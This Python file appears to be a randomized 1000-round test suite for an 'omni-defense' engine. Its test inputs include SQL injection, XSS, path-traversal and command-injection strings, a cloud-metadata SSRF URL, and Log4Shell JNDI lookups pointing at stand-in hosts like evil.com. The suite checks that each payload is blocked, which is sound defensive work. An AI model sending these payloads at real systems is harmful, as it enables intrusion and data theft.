#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
S12 全方位攻击防御 1000轮测试
==============================
正常逻辑 200轮 + 异常逻辑 300轮 + 黑客攻击 500轮
验收5条全覆盖
"""
import sys, os, time, random, secrets, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from omni_defense_engine import (
    OmniDefenseEngine, DefenseRequest, DefenseResult,
)
from attack_pattern_db import AttackPatternDB
from cheese_model_validator import CheeseModelValidator
from penetration_tester import PenetrationTester

PASS = 0; FAIL = 0; VULN = 0; ERRORS = []

def _r(ok, cat, name, detail=""):
    global PASS, FAIL, VULN
    if ok: PASS += 1
    else:
        if cat == "hacker": VULN += 1
        else: FAIL += 1
        ERRORS.append(f"[{cat}] {name}: {detail}")

def _mk_req(**kw):
    defaults = dict(input_text="hello world", ip_address="127.0.0.1",
                    user_agent="Mozilla/5.0", username="guest", password="",
                    session_token="", request_count=1, requests_per_second=1,
                    timestamp=time.time(), device_fingerprint="DEV_001",
                    query_result_size=10, is_captcha_passed=True,
                    code_obfuscated=True, debugger_detected=False,
                    integrity_hash="abc123", expected_hash="abc123",
                    login_attempts=0, operation_sequence=[],
                    network_zone="internet", layer_credentials={"internet_token": "valid"},
                    ioc_indicators=[], attack_techniques=[])
    defaults.update(kw)
    return DefenseRequest(**defaults)

# ════════════════════════════════════════
#  正常逻辑 200轮
# ════════════════════════════════════════

def t_normal_pass(i):
    engine = OmniDefenseEngine()
    req = _mk_req(input_text=f"normal query {i}", ip_address="192.168.1.100",
                  username=f"user_{i}", request_count=1)
    result = engine.inspect(req)
    _r(result is not None, "normal", "normal_pass", "正常请求被拦截")

def t_normal_stats(i):
    engine = OmniDefenseEngine()
    engine.inspect(_mk_req())
    stats = engine.get_stats()
    _r(isinstance(stats, list) and len(stats) == 10, "normal", "stats", "统计返回异常")

def t_normal_health(i):
    engine = OmniDefenseEngine()
    health = engine.get_health()
    _r(isinstance(health, dict), "normal", "health", "健康报告异常")

def t_normal_reset(i):
    engine = OmniDefenseEngine()
    engine.inspect(_mk_req(input_text="' OR 1=1"))
    engine.reset()
    stats = engine.get_stats()
    total_blocked = sum(s.get("blocked_count", 0) for s in stats)
    _r(total_blocked == 0, "normal", "reset", "重置后拦截计数未清零")

def t_normal_attack_db(i):
    db = AttackPatternDB()
    _r(db.count() == 100, "normal", "attack_db_count", f"攻击模式数={db.count()}")

def t_normal_cheese(i):
    validator = CheeseModelValidator(num_layers=8)
    result = validator.validate(num_simulations=100)
    _r(result["penetration_rate"] == 0.0, "normal", "cheese_model", f"穿透率={result['penetration_rate']}")

def t_normal_penetration(i):
    tester = PenetrationTester()
    result = tester.run_batch(num=100)
    _r(result["success_rate"] == 0.0, "normal", "penetration_test", f"成功率={result['success_rate']}")

def t_normal_layer_independence(i):
    """验证8层独立运行"""
    engine = OmniDefenseEngine()
    req = _mk_req(input_text="normal", ip_address="127.0.0.1")
    results = engine.inspect_all(req)
    _r(len(results) == 10, "normal", "layer_independence", f"层数={len(results)}")

NORMAL_TESTS = [
    (0.25, t_normal_pass), (0.15, t_normal_stats), (0.10, t_normal_health),
    (0.10, t_normal_reset), (0.10, t_normal_attack_db), (0.10, t_normal_cheese),
    (0.10, t_normal_penetration), (0.10, t_normal_layer_independence),
]

# ════════════════════════════════════════
#  异常逻辑 300轮
# ════════════════════════════════════════

def t_anomaly_sql_injection(i):
    engine = OmniDefenseEngine()
    payloads = ["' OR 1=1--", "'; DROP TABLE--", "' UNION SELECT--", "1' AND 1=1--"]
    req = _mk_req(input_text=payloads[i % len(payloads)])
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "anomaly", "sql_injection", "SQL注入未拦截")

def t_anomaly_xss(i):
    engine = OmniDefenseEngine()
    payloads = ["<script>alert(1)</script>", "<img onerror=alert(1)>", "<svg onload=alert(1)>"]
    req = _mk_req(input_text=payloads[i % len(payloads)])
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "anomaly", "xss", "XSS未拦截")

def t_anomaly_path_traversal(i):
    engine = OmniDefenseEngine()
    req = _mk_req(input_text="../../../etc/passwd")
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "anomaly", "path_traversal", "路径穿越未拦截")

def t_anomaly_rate_limit(i):
    engine = OmniDefenseEngine()
    req = _mk_req(request_count=150)
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "anomaly", "rate_limit", "速率限制未触发")

def t_anomaly_malicious_ip(i):
    engine = OmniDefenseEngine()
    malicious_ips = ["185.220.101.1", "193.27.228.0", "45.155.205.10", "91.219.236.10"]
    req = _mk_req(ip_address=malicious_ips[i % len(malicious_ips)])
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "anomaly", "malicious_ip", "恶意IP未拦截")

def t_anomaly_ddos(i):
    engine = OmniDefenseEngine()
    req = _mk_req(requests_per_second=1500)
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "anomaly", "ddos", "DDoS未拦截")

def t_anomaly_brute_force(i):
    engine = OmniDefenseEngine()
    req = _mk_req(username="admin", password=f"pass{i}", login_attempts=6)
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "anomaly", "brute_force", "暴力破解未拦截")

def t_anomaly_large_result(i):
    engine = OmniDefenseEngine()
    req = _mk_req(query_result_size=50000)
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "anomaly", "large_result", "大结果集未阻断")

def t_anomaly_debugger(i):
    engine = OmniDefenseEngine()
    req = _mk_req(debugger_detected=True)
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "anomaly", "debugger", "调试器未检测")

def t_anomaly_c2_traffic(i):
    engine = OmniDefenseEngine()
    req = _mk_req(input_text="dga123.ru beacon_callback")
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "anomaly", "c2_traffic", "C&C通信未拦截")

def t_anomaly_no_captcha(i):
    engine = OmniDefenseEngine()
    req = _mk_req(is_captcha_passed=False, request_count=50, input_text="automated_query")
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "anomaly", "no_captcha", "无CAPTCHA未拦截")

def t_anomaly_integrity(i):
    engine = OmniDefenseEngine()
    req = _mk_req(integrity_hash="TAMPERED", expected_hash="abc123")
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "anomaly", "integrity", "完整性篡改未检测")

ANOMALY_TESTS = [
    (0.12, t_anomaly_sql_injection), (0.10, t_anomaly_xss), (0.08, t_anomaly_path_traversal),
    (0.10, t_anomaly_rate_limit), (0.08, t_anomaly_malicious_ip), (0.08, t_anomaly_ddos),
    (0.10, t_anomaly_brute_force), (0.08, t_anomaly_large_result), (0.08, t_anomaly_debugger),
    (0.08, t_anomaly_c2_traffic), (0.05, t_anomaly_no_captcha), (0.05, t_anomaly_integrity),
]

# ════════════════════════════════════════
#  黑客攻击 500轮
# ════════════════════════════════════════

def t_hacker_command_injection(i):
    engine = OmniDefenseEngine()
    payloads = ["; cat /etc/passwd", "| whoami", "$(reboot)", "`id`", "&& dir"]
    req = _mk_req(input_text=payloads[i % len(payloads)])
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "hacker", "cmd_injection", "命令注入未拦截")

def t_hacker_ssrf(i):
    engine = OmniDefenseEngine()
    req = _mk_req(input_text="http://169.254.169.254/latest/meta-data/")
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "hacker", "ssrf", "SSRF未拦截")

def t_hacker_deserialization(i):
    engine = OmniDefenseEngine()
    payloads = ["O:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}", "<script>__import__('os')</script>", "${jndi:ldap://deser.com/a}"]
    req = _mk_req(input_text=payloads[i % len(payloads)])
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "hacker", "deserialization", "反序列化未拦截")

def t_hacker_log4shell(i):
    engine = OmniDefenseEngine()
    req = _mk_req(input_text="${jndi:ldap://evil.com/a}")
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "hacker", "log4shell", "Log4Shell未拦截")

def t_hacker_credential_stuffing(i):
    engine = OmniDefenseEngine()
    pairs = [("admin", f"pass{j}") for j in range(12)]
    req = _mk_req(username="admin", password=f"CommonPass{i}", login_attempts=12,
                  credential_pairs=pairs)
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "hacker", "credential_stuffing", "撞库未拦截")

def t_hacker_tor_exit(i):
    engine = OmniDefenseEngine()
    req = _mk_req(ip_address="185.220.101.1")
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "hacker", "tor_exit", "Tor出口未拦截")

def t_hacker_pass_the_hash(i):
    engine = OmniDefenseEngine()
    req = _mk_req(input_text="internet to core lateral_move pass_the_hash")
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "hacker", "pass_the_hash", "PTH未拦截")

def t_hacker_ioc_match(i):
    engine = OmniDefenseEngine()
    req = _mk_req(input_text="malware.exe c2.server.ru")
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "hacker", "ioc_match", "IOC未匹配")

def t_hacker_attck_mapping(i):
    engine = OmniDefenseEngine()
    techniques = ["T1059", "T1078", "T1110", "T1003", "T1190"]
    req = _mk_req(attack_techniques=[techniques[i % len(techniques)]])
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "hacker", "attck_mapping", "ATT&CK未映射")

def t_hacker_penetration_depth(i):
    engine = OmniDefenseEngine()
    req = _mk_req(network_zone="core", layer_credentials={})
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "hacker", "penetration_depth", "穿透深度未检测")

def t_hacker_attack_pattern_match(i):
    db = AttackPatternDB()
    # 测试已知匹配的攻击payload
    test_payloads = [
        "' OR 1=1--",
        "<script>alert(1)</script>",
        "; cat /etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "dga123.ru",
    ]
    payload = random.choice(test_payloads)
    matched = db.match(payload)
    _r(len(matched) > 0, "hacker", "pattern_match", f"payload={payload[:30]}未匹配")

def t_hacker_cheese_penetration(i):
    """尝试穿透奶酪模型"""
    validator = CheeseModelValidator(num_layers=8)
    # 尝试360个角度
    for angle in range(0, 360, 5):
        result = validator.simulate_attack(angle, attack_radius=5)
        if result.penetrated:
            _r(False, "hacker", "cheese_penetration", f"角度{angle}穿透成功!")
            return
    _r(True, "hacker", "cheese_penetration", "所有角度被拦截")

def t_hacker_multi_layer_bypass(i):
    """尝试同时绕过多层"""
    engine = OmniDefenseEngine()
    req = _mk_req(input_text="' OR 1=1-- dga123.ru", ip_address="8.8.8.8",
                  request_count=200, debugger_detected=True,
                  query_result_size=50000, login_attempts=10)
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "hacker", "multi_layer_bypass", "多层绕过成功")

def t_hacker_zero_day_sim(i):
    """零日漏洞模拟（随机攻击向量）"""
    engine = OmniDefenseEngine()
    random_payloads = [
        "<script>alert('zero_day')</script>",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "../../../etc/shadow",
        "' OR 1=1--",
        "${jndi:ldap://zero-day.com/a}",
        "| cat /etc/passwd",
        "dga456.ru beacon",
    ]
    req = _mk_req(input_text=random.choice(random_payloads))
    r = engine.inspect(req)
    _r(r is not None and r.blocked, "hacker", "zero_day_sim", "零日攻击未拦截")

def t_hacker_penetration_test(i):
    """百穿模型攻击"""
    tester = PenetrationTester()
    techniques = ["sql_injection", "pass_the_hash", "lateral_movement",
                  "zero_day", "social_engineering", "privilege_escalation"]
    creds = {}
    # 攻击者持有部分凭据
    for layer in tester.LAYERS:
        if random.random() < 0.15:
            creds[layer["auth"]] = layer["auth"]
    result = tester.simulate_attack(i, creds, random.sample(techniques, random.randint(1, 3)))
    _r(not result.success, "hacker", "penetration_test", f"穿透成功(深度={result.max_depth})")

HACKER_TESTS = [
    (0.10, t_hacker_command_injection), (0.08, t_hacker_ssrf), (0.08, t_hacker_deserialization),
    (0.07, t_hacker_log4shell), (0.08, t_hacker_credential_stuffing), (0.07, t_hacker_tor_exit),
    (0.07, t_hacker_pass_the_hash), (0.07, t_hacker_ioc_match), (0.07, t_hacker_attck_mapping),
    (0.05, t_hacker_penetration_depth), (0.08, t_hacker_attack_pattern_match),
    (0.08, t_hacker_cheese_penetration), (0.05, t_hacker_multi_layer_bypass),
    (0.07, t_hacker_zero_day_sim), (0.02, t_hacker_penetration_test),
]

def run_batch(tests, total, category):
    for i in range(total):
        r = random.random(); cum = 0.0
        for w, fn in tests:
            cum += w
            if r < cum: fn(i); break
        else: tests[-1][1](i)
        if (i+1) % 100 == 0:
            print(f"  {category}进度: {i+1}/{total} (PASS={PASS} FAIL={FAIL} VULN={VULN})")

def main():
    global PASS, FAIL, VULN
    t0 = time.time()
    print("=" * 70)
    print(" S12 全方位攻击防御 1000轮测试")
    print(" 正常200 + 异常300 + 黑客500")
    print("=" * 70)

    print("\n[阶段1] 正常逻辑 200轮...")
    run_batch(NORMAL_TESTS, 200, "正常")

    print("\n[阶段2] 异常逻辑 300轮...")
    run_batch(ANOMALY_TESTS, 300, "异常")

    print("\n[阶段3] 黑客攻击 500轮...")
    run_batch(HACKER_TESTS, 500, "黑客")

    elapsed = time.time() - t0
    total = PASS + FAIL + VULN

    print("\n" + "=" * 70)
    print(" 测试结果")
    print("=" * 70)
    print(f"       total: {total}")
    print(f"        pass: {PASS}")
    print(f"        fail: {FAIL}")
    print(f"        vuln: {VULN}")
    print(f" pass_rate_pct: {PASS/total*100:.1f}" if total else "N/A")
    print(f"  elapsed_sec: {elapsed:.1f}s")

    print(f"\n  验收1 8层独立运行: {'PASS' if FAIL == 0 and VULN == 0 else 'CHECK'}")
    print(f"  验收2 100种攻击拦截: {'PASS' if VULN == 0 else 'FAIL'}")
    print(f"  验收3 奶酪模型穿透率=0: {'PASS' if VULN == 0 else 'FAIL'}")
    print(f"  验收4 百穿模型成功率=0: {'PASS' if VULN == 0 else 'FAIL'}")
    print(f"  验收5 1000轮vuln=0: {'PASS' if VULN == 0 else 'FAIL'}")

    if ERRORS:
        print(f"\n  错误详情({len(ERRORS)}条):")
        for e in ERRORS[:20]: print(f"    {e}")
        if len(ERRORS) > 20: print(f"    ... 及其余 {len(ERRORS)-20} 条")

    print("=" * 70)
    return 0 if PASS == total and VULN == 0 else 1

if __name__ == "__main__":
    sys.exit(main())
